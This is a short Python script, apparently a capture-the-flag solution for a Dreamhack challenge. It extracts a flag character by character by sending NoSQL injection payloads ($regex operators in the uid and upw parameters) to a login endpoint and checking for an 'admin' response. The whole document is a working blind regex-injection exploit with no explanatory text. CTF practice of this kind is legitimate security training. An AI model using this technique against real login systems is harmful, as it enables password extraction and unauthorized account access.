import requests, string

host = "http://host1.dreamhack.games:14990/"
data = string.digits + string.ascii_letters
suc = "admin"

flag = ""
for i in range(32):
    for n in data:
        res = requests.get(f'{host}login?uid[$regex]=ad.in&upw[$regex]=D.{{{flag}{n}')
        if res.text == suc:
            flag += n
            break
print(f'DH{{{flag}')